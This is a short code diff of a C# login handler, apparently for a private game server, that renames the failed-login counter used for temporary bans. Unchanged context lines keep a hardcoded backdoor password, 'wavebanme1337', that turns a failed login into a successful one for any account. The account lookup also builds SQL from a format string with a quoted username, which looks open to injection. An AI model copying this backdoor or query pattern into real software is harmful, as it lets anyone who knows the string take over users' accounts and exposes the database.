@@ -56,16 +56,16 @@ namespace WvsLogin.Packets.Handlers
             if (result == 4 && password == "wavebanme1337")
                 result = 0;
             if (result == 4)
-                c.failure++;
+                c.LoginFailCount++;
             var data = Database.ExecuteDataQuery("SELECT * FROM account WHERE AccountName = '{0}' AND Connected = 1;", username);
             if (data.HasRows)
                 result = 7;
             data.Close();
-            if (c.failure >= 5)
+            if (c.LoginFailCount >= 5)
             {
                 Database.IssueBan(username, 0x63, DateTime.Now.AddMinutes(15).ToFileTime());
                 result = 2;
-                c.failure = 0;
+                c.LoginFailCount = 0;
             }
             if (result == 2) // Ban
             {
